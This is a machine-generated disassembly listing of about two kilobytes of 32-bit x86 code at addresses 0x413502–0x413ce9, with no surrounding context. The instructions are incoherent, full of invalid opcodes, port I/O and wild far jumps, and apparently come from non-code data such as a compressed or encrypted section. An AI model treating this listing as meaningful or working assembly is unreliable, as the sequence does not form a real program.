  413502:	push   esi
  413503:	sub    DWORD PTR [ecx],edi
  413505:	sbb    DWORD PTR [ebx+0x19],esp
  413508:	push   ebx
  413509:	js     0x4134e1
  41350b:	fcom   QWORD PTR [ecx+0x7]
  41350e:	lahf   
  41350f:	jno    0x413560
  413511:	xchg   BYTE PTR [esi],bh
  413513:	fcomp  DWORD PTR [edi+esi*4]
  413516:	arpl   WORD PTR [ecx-0x19dfd1a7],sp
  41351c:	dec    ebx
  41351d:	daa    
  41351e:	xchg   edx,eax
  41351f:	cld    
  413520:	mov    WORD PTR ds:0xf81ec128,gs
  413526:	cmp    eax,0x8bc75a4c
  41352b:	int3   
  41352c:	pop    ebp
  41352d:	sbb    bh,BYTE PTR [edi]
  41352f:	xchg   ebx,eax
  413530:	adc    edx,DWORD PTR [ebx-0x5b487f66]
  413536:	dec    edi
  413537:	sub    edi,DWORD PTR [ecx-0x77763ba2]
  41353d:	pushw  ds
  41353f:	add    eax,0xf7e1b209
  413544:	push   ecx
  413545:	cmp    al,0x6d
  413547:	cmp    eax,0x353da09d
  41354c:	or     eax,0x5c816989
  413551:	fadd   DWORD PTR [esp+edx*2-0x18]
  413555:	in     al,0x76
  413557:	jge    0x413513
  413559:	mov    ebp,0x8f47167a
  41355e:	ins    BYTE PTR es:[edi],dx
  41355f:	clc    
  413560:	pop    ss
  413561:	fsubr  DWORD PTR [ecx-0x40]
  413564:	aam    0x9e
  413566:	dec    edx
  413567:	xor    DWORD PTR [edi],esp
  413569:	xchg   BYTE PTR [esp+edi*4-0x1],cl
  41356d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41356e:	mov    ecx,0xa7c00ce0
  413573:	and    BYTE PTR [ebx],ah
  413575:	xchg   BYTE PTR [eax],al
  413577:	jmp    0x41353b
  413579:	inc    esp
  41357a:	(bad)  
  41357b:	imul   edi,ecx,0x82ac50c6
  413581:	xchg   edx,eax
  413582:	in     al,dx
  413583:	pop    esi
  413584:	call   0x9f4f:0x316b098
  41358b:	mov    ecx,0xd6f4b11e
  413590:	push   cs
  413591:	hlt    
  413592:	fimul  WORD PTR [edx+0x6c231809]
  413598:	popa   
  413599:	aaa    
  41359a:	mov    WORD PTR [eax+0x38f622de],es
  4135a0:	sbb    edi,DWORD PTR [edx+edi*4-0x6e33b094]
  4135a7:	test   DWORD PTR [ebx],ecx
  4135a9:	mov    DWORD PTR [esi+0x6],ebp
  4135ac:	(bad)  
  4135ad:	xchg   ebp,eax
  4135ae:	dec    edx
  4135af:	dec    esi
  4135b0:	pop    ds
  4135b1:	sbb    eax,0x6422874d
  4135b6:	xchg   DWORD PTR [eax+0x51],esp
  4135b9:	lea    esp,[esi-0x2f]
  4135bc:	ja     0x4135a3
  4135be:	out    0x0,eax
  4135c0:	mov    WORD PTR [eax+ecx*4-0x35],gs
  4135c4:	rcl    DWORD PTR [edi+edi*2],cl
  4135c7:	outs   dx,BYTE PTR ds:[esi]
  4135c8:	dec    edx
  4135c9:	je     0x4135dc
  4135cb:	xchg   ecx,eax
  4135cc:	repnz imul edx,DWORD PTR [edi+0x6e],0x14543912
  4135d4:	mov    BYTE PTR [edi-0x44],0x6c
  4135d8:	mov    esi,0xe8ff032
  4135dd:	repz dec esp
  4135df:	pusha  
  4135e0:	or     ebp,DWORD PTR [eax-0x63]
  4135e3:	pop    ecx
  4135e4:	pop    ds
  4135e5:	inc    ebp
  4135e6:	adc    esi,DWORD PTR [eax+0x4e7766dd]
  4135ec:	outs   dx,BYTE PTR ds:[esi]
  4135ed:	mov    dh,0x6f
  4135ef:	push   es
  4135f0:	mov    edx,0xb1e44eda
  4135f5:	adc    dl,BYTE PTR [ecx]
  4135f7:	hlt    
  4135f8:	scas   al,BYTE PTR es:[edi]
  4135f9:	pusha  
  4135fa:	out    dx,al
  4135fb:	mov    edx,0x5fb852ad
  413600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413601:	xchg   BYTE PTR [esi+0x16a69f1d],bl
  413607:	into   
  413608:	sub    BYTE PTR [ebx+0x60],bh
  41360b:	nop
  41360c:	or     al,0x74
  41360e:	sub    DWORD PTR [edi+eax*4-0x5f14b1e1],edx
  413615:	fldenv [esi+0x74]
  413618:	mov    edi,0x42bd8fdb
  41361d:	xchg   BYTE PTR [edi+0x60],al
  413620:	pop    ds
  413621:	fbld   TBYTE PTR [edi+0x24]
  413624:	icebp  
  413625:	iret   
  413626:	jno    0xa1980e45
  41362c:	les    esp,FWORD PTR [edx-0x51]
  41362f:	cmp    DWORD PTR [ecx+0x2019303b],0x1cde10e
  413639:	sbb    BYTE PTR [edx],dh
  41363b:	ins    DWORD PTR es:[edi],dx
  41363c:	xchg   edx,eax
  41363d:	test   dh,ch
  41363f:	sub    al,0xe9
  413641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413642:	retf   0xc9d9
  413645:	jp     0x4136bc
  413647:	out    dx,al
  413648:	add    DWORD PTR [edi],ebx
  41364a:	cmp    al,0xb1
  41364c:	bound  ebx,QWORD PTR [esi]
  41364e:	(bad)  
  413650:	xor    eax,0x866a1d6a
  413655:	nop
  413656:	or     DWORD PTR [ebx],eax
  413658:	inc    ebx
  413659:	dec    ebx
  41365a:	mov    dh,0x7e
  41365c:	pop    esi
  41365d:	in     eax,0x8e
  41365f:	dec    ecx
  413660:	daa    
  413661:	sti    
  413662:	jno    0x413608
  413664:	frstpm(287 only) 
  413666:	xchg   BYTE PTR [edi+eax*8-0x7c05372c],ah
  41366d:	and    DWORD PTR [eax],ecx
  41366f:	fst    DWORD PTR [eax+0x2]
  413672:	push   DWORD PTR [edx-0x5d]
  413675:	loope  0x4136c7
  413677:	jnp    0x4136d7
  413679:	mov    cl,0x26
  41367b:	mov    bh,0xf0
  41367d:	(bad)  
  41367e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41367f:	and    al,0xc0
  413681:	dec    edi
  413682:	cmp    cl,BYTE PTR [edx+eax*8-0x2e]
  413686:	adc    BYTE PTR [esi],dl
  413688:	mov    edi,0xf0e4e91d
  41368d:	sbb    BYTE PTR [edi-0x25],al
  413690:	outs   dx,BYTE PTR ds:[esi]
  413691:	mov    ebx,0xd9fdfe5f
  413696:	inc    ecx
  413697:	fmul   st,st(3)
  413699:	fwait
  41369a:	cmp    BYTE PTR [edx-0x3],0xe2
  41369e:	arpl   WORD PTR ss:[ecx+0x26],di
  4136a2:	jno    0x413630
  4136a4:	lock call 0x55fb:0x53218c04
  4136ac:	pop    ds
  4136ad:	xchg   ecx,eax
  4136ae:	jle    0x413725
  4136b0:	xor    DWORD PTR [ebx-0x4a87f22a],0x5a
  4136b7:	jge    0x413639
  4136b9:	xor    eax,0xa018b5c6
  4136be:	mov    bh,0x88
  4136c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136c1:	adc    bl,BYTE PTR [edi-0x6]
  4136c4:	adc    DWORD PTR fs:[edi+ebp*4],eax
  4136c8:	sub    al,0xa2
  4136ca:	cdq    
  4136cb:	cli    
  4136cc:	cmp    BYTE PTR [edx+ecx*8+0x784ccb79],0xf4
  4136d4:	mov    DWORD PTR [esi-0x76],ebp
  4136d7:	xor    bh,BYTE PTR [edi+0x58]
  4136da:	mov    ecx,0x95753b8a
  4136df:	int    0x6b
  4136e1:	sbb    DWORD PTR [ebx-0x2b],ecx
  4136e4:	mov    ah,BYTE PTR [ebp-0x7a]
  4136e7:	cli    
  4136e8:	pusha  
  4136e9:	lock icebp 
  4136eb:	adc    al,0x51
  4136ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136ef:	imul   esi,DWORD PTR [edi+ebx*2],0x1b3cb9a2
  4136f6:	and    al,0xd5
  4136f8:	push   edx
  4136f9:	sbb    bl,BYTE PTR [edx+0x66]
  4136fc:	mov    al,0x8a
  4136fe:	mov    esi,DWORD PTR [eax+0x6189a824]
  413704:	and    bh,BYTE PTR [edx]
  413706:	dec    edi
  413707:	pop    ecx
  413708:	and    bl,BYTE PTR [edx+0x5506f4b4]
  41370e:	aam    0x43
  413710:	adc    ch,al
  413712:	repnz test DWORD PTR [ebp+0x2eab02fa],edx
  413719:	in     eax,0xe
  41371b:	adc    bl,BYTE PTR [edi]
  41371d:	test   eax,0xdf34c5b
  413722:	or     ebx,DWORD PTR ds:0xcae47d0b
  413728:	sbb    al,0x7f
  41372a:	mov    al,0xfb
  41372c:	sbb    ah,dh
  41372e:	mov    al,0x6f
  413730:	adc    DWORD PTR [edi],0xef212c51
  413736:	inc    esp
  413737:	in     eax,dx
  413738:	repz sub eax,0xfa9a3cbb
  41373e:	jl     0x413768
  413740:	gs sti 
  413742:	cmp    BYTE PTR [ebx],cl
  413744:	mov    ah,ch
  413746:	sub    al,0xc4
  413748:	loope  0x413718
  41374a:	out    0x69,eax
  41374c:	add    esi,edi
  41374e:	gs mov dh,0x99
  413751:	add    ah,0x21
  413754:	xor    al,0xb3
  413756:	(bad)  
  413757:	(bad)  
  413759:	xor    eax,DWORD PTR [eax-0x77]
  41375c:	push   ds
  41375d:	adc    eax,0x1e88511b
  413762:	cmp    BYTE PTR [ebp+0x61],0xb9
  413766:	enter  0xe8cf,0xc4
  41376a:	data16 jae 0x4136f2
  41376d:	addr16 (bad) 
  41376f:	xor    eax,0xa85bac66
  413774:	cmp    dh,al
  413776:	pop    esi
  413777:	daa    
  413778:	mov    eax,ds:0x398505e8
  41377d:	imul   esi,DWORD PTR [ebp-0x3bcbd7c7],0x4f1d52d5
  413787:	jo     0x41379a
  413789:	iret   
  41378a:	enter  0x3ba0,0xe1
  41378e:	jecxz  0x41380e
  413790:	pop    ecx
  413791:	xchg   ebp,eax
  413792:	or     ah,BYTE PTR [ebx+0x5b]
  413795:	or     al,0x1
  413797:	es imul ecx,edi,0xb3a2c232
  41379e:	nop
  41379f:	lahf   
  4137a0:	(bad)  
  4137a1:	sub    BYTE PTR [edx],bl
  4137a3:	pop    eax
  4137a4:	dec    ebx
  4137a5:	inc    edi
  4137a6:	fistp  WORD PTR [eax+0x4f22bcc7]
  4137ac:	adc    al,0x57
  4137ae:	cmp    dh,BYTE PTR [esp+ebx*1-0x15]
  4137b2:	(bad)  
  4137b3:	call   0xb1767dec
  4137b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137b9:	sub    eax,0x83904640
  4137be:	in     eax,dx
  4137bf:	popa   
  4137c0:	outs   dx,BYTE PTR ds:[esi]
  4137c1:	cs mov al,0xcc
  4137c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137c5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4137c7:	adc    cl,bl
  4137c9:	adc    BYTE PTR ds:0x19317b7b,cl
  4137cf:	push   0x8638167b
  4137d4:	mov    bh,0x93
  4137d6:	pop    ds
  4137d7:	pop    esi
  4137d8:	stos   DWORD PTR es:[edi],eax
  4137d9:	add    eax,0xc7948011
  4137de:	cld    
  4137df:	jecxz  0x413792
  4137e1:	call   0x1060df5
  4137e6:	add    BYTE PTR [ebx],cl
  4137e8:	jl     0x413844
  4137ea:	rcr    DWORD PTR [esi],1
  4137ec:	lahf   
  4137ed:	int    0x34
  4137ef:	sub    esi,DWORD PTR [esi-0x42]
  4137f2:	push   0xffffffff
  4137f4:	fbstp  TBYTE PTR [esi+ebp*2+0xc10f97b]
  4137fb:	pop    ebp
  4137fc:	jmp    0x41377f
  4137fe:	retf   
  4137ff:	call   0x5e877048
  413804:	push   cs
  413805:	jne    0x41378d
  413807:	repnz mov edi,0x66b32b01
  41380d:	pop    ecx
  41380e:	out    dx,al
  41380f:	pop    ebx
  413810:	in     eax,dx
  413811:	jne    0x413859
  413813:	mov    edi,DWORD PTR [ecx-0x55bd9a66]
  413819:	mov    BYTE PTR [ebp+edi*4+0x7691f2bf],al
  413820:	xchg   esi,eax
  413821:	std    
  413822:	mov    bl,0xc2
  413824:	cwde   
  413825:	mov    bh,0x65
  413827:	inc    ecx
  413828:	jge    0x4137fc
  41382a:	cmc    
  41382b:	add    al,0xcd
  41382d:	test   ebx,esi
  41382f:	push   eax
  413830:	or     ch,BYTE PTR [ecx-0x7e]
  413833:	add    eax,DWORD PTR [eax+0x66]
  413836:	or     edx,DWORD PTR [edi-0xe797591]
  41383c:	mov    ebp,0x5826c2f9
  413841:	push   esi
  413842:	dec    esp
  413843:	jp     0x4137c8
  413845:	adc    BYTE PTR [eax],0xb7
  413848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413849:	xor    BYTE PTR [ecx],ch
  41384b:	pop    edx
  41384c:	lock in al,dx
  41384e:	push   ebx
  41384f:	sub    DWORD PTR [eax+edi*8-0x11],ebp
  413853:	fild   DWORD PTR [ecx+0x1c2d38b]
  413859:	cmp    edi,DWORD PTR [edx+0x2c220db8]
  41385f:	mov    DWORD PTR [eax+ecx*1+0x75c60199],edx
  413866:	fs push ds
  413868:	sar    DWORD PTR [edi-0x9],0x5d
  41386c:	fwait
  41386d:	jg     0x413855
  41386f:	pop    es
  413870:	call   0x2515d32b
  413875:	xchg   ecx,eax
  413876:	and    ecx,DWORD PTR [ebx+0x16]
  413879:	lds    ebx,FWORD PTR [edi*8-0x74d44748]
  413880:	mov    bl,bl
  413882:	cs add eax,0x62bf20b1
  413888:	adc    al,0x33
  41388a:	sub    eax,0xcd89d600
  41388f:	mov    eax,DWORD PTR [ebx+0x4a]
  413892:	jl     0x413879
  413894:	outs   dx,DWORD PTR ds:[esi]
  413895:	cmc    
  413896:	or     al,0x29
  413898:	das    
  413899:	out    dx,eax
  41389a:	pop    esi
  41389b:	xchg   ah,ch
  41389d:	xor    edi,DWORD PTR [ecx+edx*4]
  4138a0:	stc    
  4138a1:	xlat   BYTE PTR ds:[ebx]
  4138a2:	popf   
  4138a3:	ins    DWORD PTR es:[edi],dx
  4138a4:	cmp    DWORD PTR [edx+eiz*1-0x67],esi
  4138a8:	xor    DWORD PTR [ebx-0xba0cec9],eax
  4138ae:	ja     0x41392e
  4138b0:	cli    
  4138b1:	adc    DWORD PTR [ebp+0x6e],ecx
  4138b4:	out    0xe,al
  4138b6:	or     eax,0x2eb40fc4
  4138bb:	xor    ah,BYTE PTR [edx]
  4138bd:	jmp    0xa7e6:0x1c6f5c8b
  4138c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138c5:	out    dx,al
  4138c6:	into   
  4138c7:	repnz inc eax
  4138c9:	shl    BYTE PTR [ebx+0x4b],0x4c
  4138cd:	nop
  4138ce:	jmp    0x7c72:0x7efe0873
  4138d5:	dec    esi
  4138d6:	add    esp,DWORD PTR [eax+0x7a]
  4138d9:	adc    al,0x31
  4138db:	popa   
  4138dc:	pop    esp
  4138dd:	fucomp st(3)
  4138df:	cdq    
  4138e0:	test   BYTE PTR [edi-0x38],al
  4138e3:	xchg   esi,eax
  4138e4:	(bad)
  4138e9:	pop    ss
  4138ea:	xchg   edi,eax
  4138eb:	ror    ebx,0xc9
  4138ee:	jg     0x413914
  4138f0:	clc    
  4138f1:	ret    0x164d
  4138f4:	dec    ebx
  4138f5:	iret   
  4138f6:	(bad)  
  4138f8:	ficom  DWORD PTR [ebp-0x12622161]
  4138fe:	cmp    ebp,DWORD PTR [eax+0x2f0d250f]
  413904:	mov    bh,0x68
  413906:	jge    0x4138bf
  413908:	jnp    0x4138e6
  41390a:	(bad)
  41390d:	xor    eax,0xf0cd142b
  413912:	push   ecx
  413913:	jne    0x4138ea
  413915:	hlt    
  413916:	add    edi,edi
  413918:	add    esp,DWORD PTR [esi+0x3f]
  41391b:	push   ds
  41391c:	adc    al,0xc1
  41391e:	(bad)  
  413920:	inc    esi
  413921:	int    0xcb
  413923:	sbb    DWORD PTR [ebx-0x205de864],0x2470b4cf
  41392d:	push   es
  41392e:	ret    0x9c45
  413931:	ins    DWORD PTR es:[edi],dx
  413932:	fwait
  413933:	adc    edx,ebp
  413935:	mov    ebx,0x4ed13f3e
  41393a:	jns    0x4139a9
  41393c:	shl    ch,1
  41393e:	and    eax,0xb07ef87a
  413943:	arpl   WORD PTR [esi-0x1332989b],di
  413949:	mov    edi,DWORD PTR [edi-0x42bcbd44]
  41394f:	dec    edx
  413950:	aaa    
  413951:	cmp    al,0xdc
  413953:	hlt    
  413954:	scas   eax,DWORD PTR es:[edi]
  413955:	sar    BYTE PTR [eax+0x51ea19a3],1
  41395b:	jno    0x413986
  41395d:	or     ecx,DWORD PTR ss:[ebp-0x4b6d0e3c]
  413964:	cmp    BYTE PTR [ecx-0x6f1a3e79],al
  41396a:	adc    eax,0xd6f1a9dc
  41396f:	mov    esp,0xa0282164
  413974:	pop    edi
  413975:	jle    0x413927
  413977:	jmp    0x4138f9
  413979:	shufps xmm6,XMMWORD PTR [ebp+0x68],0x52
  41397e:	js     0x4139e2
  413980:	rcl    DWORD PTR [edi-0x67],cl
  413983:	inc    edi
  413984:	jg     0x4139c0
  413986:	ss sub dl,bh
  413989:	push   es
  41398a:	in     al,0x80
  41398c:	adc    eax,0xb59db470
  413991:	pusha  
  413992:	or     ecx,DWORD PTR [edx]
  413994:	sub    al,ch
  413996:	js     0x413a0d
  413998:	sub    ah,BYTE PTR [edi+0x28]
  41399b:	inc    esi
  41399c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41399d:	or     DWORD PTR [ebp+0x3c],ecx
  4139a0:	lea    edi,[eax+0x22]
  4139a3:	jmp    0x4139d5
  4139a5:	out    0xf9,al
  4139a7:	mov    eax,ds:0x649678d3
  4139ac:	mov    ds:0xf2202bd0,al
  4139b1:	inc    ebp
  4139b2:	fidiv  WORD PTR [ebx]
  4139b4:	or     eax,0x5f94452
  4139b9:	xor    cl,BYTE PTR [eax-0x8c913a4]
  4139bf:	adc    ebp,DWORD PTR [edi+0x478f3f38]
  4139c5:	cmp    ebx,DWORD PTR [edx-0x1051c16b]
  4139cb:	or     eax,0x39594209
  4139d0:	out    0x1e,eax
  4139d2:	jl     0x413a4f
  4139d4:	jne    0x4139a0
  4139d6:	out    dx,al
  4139d7:	lea    ecx,[eax+0x25]
  4139da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139db:	(bad)  
  4139dc:	loopne 0x4139fb
  4139de:	or     dl,al
  4139e0:	push   ss
  4139e1:	cmp    DWORD PTR [edx-0x79],eax
  4139e4:	out    dx,al
  4139e5:	cmp    dh,0x89
  4139e8:	and    eax,0xd3e54dc7
  4139ed:	or     DWORD PTR [ebp-0x3d7e6e57],edi
  4139f3:	push   ecx
  4139f4:	dec    edx
  4139f6:	loopne 0x41397d
  4139f8:	popa   
  4139f9:	jbe    0x413a43
  4139fb:	stos   DWORD PTR es:[edi],eax
  4139fc:	sahf   
  4139fd:	jl     0x413a17
  4139ff:	jmp    0x4139e7
  413a01:	jg     0x41399e
  413a03:	outs   dx,BYTE PTR ds:[esi]
  413a04:	clc    
  413a05:	lock daa 
  413a07:	cmp    BYTE PTR [eax-0x75d68c94],cl
  413a0d:	jae    0x4139f1
  413a0f:	fnsave [ebx+eax*4]
  413a12:	pop    es
  413a13:	mul    DWORD PTR [esi]
  413a15:	xchg   ebx,eax
  413a16:	ret    0xd1a0
  413a19:	mov    bl,0x15
  413a1b:	repnz sbb al,0x8c
  413a1e:	add    eax,0xd4273311
  413a23:	pop    ebp
  413a24:	inc    esi
  413a25:	or     ecx,DWORD PTR ds:0x1d4f29cd
  413a2b:	lock aaa 
  413a2d:	test   bl,dh
  413a2f:	pusha  
  413a30:	inc    eax
  413a31:	jo     0x413a4e
  413a33:	jecxz  0x413a97
  413a35:	xor    ebp,edx
  413a37:	int    0x93
  413a39:	jle    0x413a52
  413a3b:	or     eax,0x4b4f62db
  413a40:	add    bl,dl
  413a42:	sbb    BYTE PTR [edx-0x3fb3ff18],dh
  413a48:	pop    ebx
  413a49:	add    ebp,DWORD PTR [ebx+0x7fb4169f]
  413a4f:	push   0xff64b5e7
  413a54:	aaa    
  413a55:	xor    BYTE PTR [eax-0x14d3d44d],dh
  413a5b:	sbb    al,0xd6
  413a5d:	test   DWORD PTR [eax+0x79],edi
  413a60:	push   ebp
  413a61:	mul    DWORD PTR [ebp+0x17]
  413a64:	mov    eax,ds:0x42d3da78
  413a69:	xchg   ebx,eax
  413a6a:	test   al,0xe4
  413a6c:	inc    edi
  413a6d:	sti    
  413a6e:	and    bl,BYTE PTR [eax+0x6d9d4a6a]
  413a74:	jbe    0x413aa8
  413a76:	ror    ebp,1
  413a78:	mov    WORD PTR [ecx-0x2674e9ff],?
  413a7e:	aaa    
  413a7f:	dec    esp
  413a80:	enter  0x59d3,0xc3
  413a84:	aas    
  413a85:	jmp    0x205f:0x89e0
  413a8b:	push   esi
  413a8c:	mov    ds:0xfbbb32b9,eax
  413a91:	test   BYTE PTR [eax],dh
  413a93:	test   ah,bh
  413a95:	or     eax,0xbab150f4
  413a9a:	enter  0xace9,0x3c
  413a9e:	mov    al,0x76
  413aa0:	dec    edi
  413aa1:	aaa    
  413aa2:	xchg   esi,eax
  413aa3:	sub    BYTE PTR [ebp-0x62],0x4e
  413aa7:	cmp    BYTE PTR [edi+eax*2+0x4a729c35],cl
  413aae:	fnstsw WORD PTR [eax]
  413ab0:	outs   dx,DWORD PTR fs:[esi]
  413ab2:	xlat   BYTE PTR ds:[ebx]
  413ab3:	push   ecx
  413ab4:	call   0x256d:0xc9c68796
  413abb:	inc    edi
  413abc:	push   esi
  413abd:	je     0x413b20
  413abf:	lahf   
  413ac0:	xor    cl,BYTE PTR ds:[eax]
  413ac3:	iret   
  413ac4:	push   es
  413ac5:	dec    esp
  413ac6:	mov    DWORD PTR [ecx-0x70],ebp
  413ac9:	xor    BYTE PTR ds:[ecx+0x66],0x1f
  413ace:	out    dx,eax
  413acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ad0:	jo     0x413ada
  413ad2:	mov    ah,0x2b
  413ad4:	cmc    
  413ad5:	bound  esi,QWORD PTR [edx]
  413ad7:	add    BYTE PTR [ecx-0x1eb164f2],bh
  413add:	sbb    eax,0x227cf692
  413ae2:	dec    edi
  413ae3:	fild   DWORD PTR [edx]
  413ae5:	sbb    DWORD PTR [edx],0xccf006fa
  413aeb:	dec    eax
  413aec:	adc    esi,DWORD PTR [edi-0x68984615]
  413af2:	mov    eax,0x77fd9624
  413af7:	dec    ecx
  413af8:	test   BYTE PTR [ebp-0x66],dh
  413afb:	aam    0xf2
  413afd:	inc    eax
  413afe:	(bad)  
  413b00:	pushf  
  413b01:	int3   
  413b02:	mov    ds:0x5c6897f9,eax
  413b07:	cmp    ecx,edx
  413b09:	push   0xffffffb8
  413b0b:	frstor ss:[edi-0x48]
  413b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b10:	push   ss
  413b11:	mov    dl,0x24
  413b13:	ror    BYTE PTR [ebp-0x1e],cl
  413b16:	aad    0xe8
  413b18:	jb     0x413acc
  413b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b1b:	call   0xf6381795
  413b20:	hlt    
  413b21:	stc    
  413b22:	cmp    eax,0xc89838d9
  413b27:	fdivr  DWORD PTR [esi+0x31287af8]
  413b2d:	add    eax,0x34a27e34
  413b32:	add    BYTE PTR [eax+0x21],ch
  413b35:	sub    eax,0x1e989c40
  413b3a:	cmp    eax,0x6efde1af
  413b3f:	sub    eax,0xd4f53981
  413b44:	call   0xa60da4a5
  413b49:	and    al,0x26
  413b4b:	ss (bad) 
  413b4d:	out    0xa2,al
  413b4f:	jl     0x413b4b
  413b51:	fcmovb st,st(5)
  413b53:	addr16 clc 
  413b55:	cld    
  413b56:	sahf   
  413b57:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  413b59:	stos   BYTE PTR es:[edi],al
  413b5a:	aad    0xc3
  413b5c:	mov    bl,0x18
  413b5e:	rcr    DWORD PTR [ebx+0x6bc1ba8b],cl
  413b64:	jbe    0x413b17
  413b66:	in     eax,dx
  413b67:	or     esp,ecx
  413b69:	jmp    0x413b41
  413b6b:	fdivr  DWORD PTR [edi+0x5e9b48ff]
  413b71:	mov    DWORD PTR ds:0x612a1c7c,ebp
  413b77:	sub    eax,0x9de2183b
  413b7c:	dec    esi
  413b7d:	inc    ebp
  413b7e:	and    cl,al
  413b80:	or     esp,esi
  413b82:	pop    ebp
  413b83:	scas   eax,DWORD PTR es:[edi]
  413b84:	sbb    al,0x6a
  413b86:	sbb    DWORD PTR ds:0x4a25a25,ebx
  413b8c:	and    ebx,DWORD PTR [ebx]
  413b8e:	pop    edi
  413b8f:	cdq    
  413b90:	push   ds
  413b91:	idiv   BYTE PTR [eax-0x65]
  413b94:	push   ds
  413b95:	test   esp,esp
  413b97:	ret    
  413b98:	out    0x3c,eax
  413b9a:	(bad)  
  413b9b:	clc    
  413b9c:	pop    ebp
  413b9d:	or     eax,DWORD PTR [ecx-0x6e]
  413ba0:	xchg   ebx,eax
  413ba1:	and    ah,bl
  413ba3:	fadd   QWORD PTR ds:0xdf1c89d9
  413ba9:	not    DWORD PTR [eax-0x6d]
  413bac:	adc    eax,0xb34a8274
  413bb1:	mov    ds:0xefdbf242,al
  413bb6:	das    
  413bb7:	ins    DWORD PTR es:[edi],dx
  413bb8:	and    edi,DWORD PTR [ebx-0x56]
  413bbb:	add    BYTE PTR [edx+0x59606eac],dl
  413bc1:	sbb    bl,dh
  413bc3:	pop    ss
  413bc4:	or     al,0xad
  413bc6:	inc    eax
  413bc7:	mov    ebp,0xc938f17f
  413bcc:	fs dec eax
  413bce:	test   eax,0x24c9923b
  413bd3:	lea    edi,[ecx+0x57]
  413bd6:	in     eax,dx
  413bd7:	xor    eax,0xa57cc56c
  413bdc:	loope  0x413bee
  413bde:	push   esp
  413bdf:	adc    eax,0x8eca032b
  413be4:	jl     0x413c45
  413be6:	ffree  st(0)
  413be8:	xchg   BYTE PTR [edi],bh
  413bea:	sub    ebx,eax
  413bec:	cmp    DWORD PTR [esi+esi*2-0x702edd49],eax
  413bf3:	enter  0x7148,0x22
  413bf7:	add    eax,0x9f8c71a3
  413bfc:	aad    0xa5
  413bfe:	xchg   sp,ax
  413c00:	aad    0x8d
  413c02:	jns    0x413bcb
  413c04:	int3   
  413c05:	imul   ebp,DWORD PTR [eax-0x49],0xffffffb1
  413c09:	jae    0x413c83
  413c0b:	jl     0x413bb2
  413c0d:	inc    ecx
  413c0e:	pop    ebx
  413c0f:	jnp    0x413bc9
  413c11:	mov    ecx,0x34339e50
  413c16:	and    al,0x47
  413c18:	lahf   
  413c19:	daa    
  413c1a:	and    ecx,DWORD PTR ds:[edx+ebp*8]
  413c1e:	sub    al,BYTE PTR [eax-0x50]
  413c21:	xchg   esi,eax
  413c22:	mov    ds:0xf5e32958,eax
  413c27:	inc    edi
  413c28:	xchg   edi,eax
  413c29:	sub    DWORD PTR [edi+0x5437f7ef],0x69
  413c30:	(bad)  
  413c31:	lods   eax,DWORD PTR ds:[esi]
  413c32:	ins    BYTE PTR es:[edi],dx
  413c33:	or     al,BYTE PTR [edx]
  413c35:	(bad)  
  413c36:	(bad)  
  413c37:	mov    dh,0x8d
  413c39:	ins    DWORD PTR es:[edi],dx
  413c3a:	jmp    esi
  413c3c:	sub    eax,0x578e9fcf
  413c41:	pusha  
  413c42:	jmp    0xcb04:0xea3601b2
  413c49:	lea    ebx,[esi+edi*1-0x754d5efc]
  413c50:	mov    ds:0xcd9954de,eax
  413c55:	jae    0x413c10
  413c57:	dec    eax
  413c58:	(bad)  
  413c59:	xchg   ebx,eax
  413c5a:	loopne 0x413cb5
  413c5c:	test   BYTE PTR [eax-0x22],ch
  413c5f:	xor    al,ch
  413c61:	std    
  413c62:	std    
  413c63:	and    eax,0xa71c7af8
  413c68:	jecxz  0x413cd8
  413c6a:	shr    cl,1
  413c6c:	icebp  
  413c6d:	iret   
  413c6e:	imul   ebx,esp,0xd8d552c7
  413c74:	xchg   BYTE PTR [ebp+esi*4+0x46f2010c],dh
  413c7b:	mov    gs,WORD PTR [esi]
  413c7d:	push   edi
  413c7e:	ss mov al,0x12
  413c81:	arpl   WORD PTR [ebp+0x5582757c],sp
  413c87:	call   0x620440f4
  413c8c:	call   0x54fd:0x8cd740c6
  413c93:	dec    eax
  413c94:	pusha  
  413c95:	retf   
  413c96:	out    0x43,al
  413c98:	pushf  
  413c99:	shl    BYTE PTR [esi-0xa],1
  413c9c:	fld    st(3)
  413c9e:	or     BYTE PTR [ebx+0x61],0xd7
  413ca2:	arpl   ax,bp
  413ca4:	mov    esp,0x5a404502
  413ca9:	xchg   esp,eax
  413caa:	mov    ebp,0xe9d49626
  413caf:	inc    edi
  413cb0:	pusha  
  413cb1:	xchg   esp,eax
  413cb2:	test   DWORD PTR [edx+0x78826825],ecx
  413cb8:	in     al,0x82
  413cba:	xchg   DWORD PTR [ecx+0x44a1d8f3],edi
  413cc0:	pop    ebp
  413cc1:	int    0xcf
  413cc3:	gs push ebx
  413cc5:	fxch   st(6)
  413cc7:	jb     0x413cfd
  413cc9:	stos   BYTE PTR es:[edi],al
  413cca:	out    dx,eax
  413ccb:	es or  al,0xc9
  413cce:	jmp    0x413d2e
  413cd0:	mov    ?,ecx
  413cd2:	sbb    cl,ah
  413cd4:	sbb    BYTE PTR [edi],bh
  413cd6:	js     0x413c8d
  413cd8:	jbe    0x413c9a
  413cda:	push   0xd
  413cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cdd:	lods   al,BYTE PTR ds:[esi]
  413cde:	(bad)  
  413cdf:	push   ebp
  413ce0:	fld    DWORD PTR [esi-0x6e]
  413ce3:	leave  
  413ce4:	dec    ebx
  413ce5:	push   0x60
  413ce7:	aam    0x15
  413ce9:	xor    edi,DWORD PTR [eax]
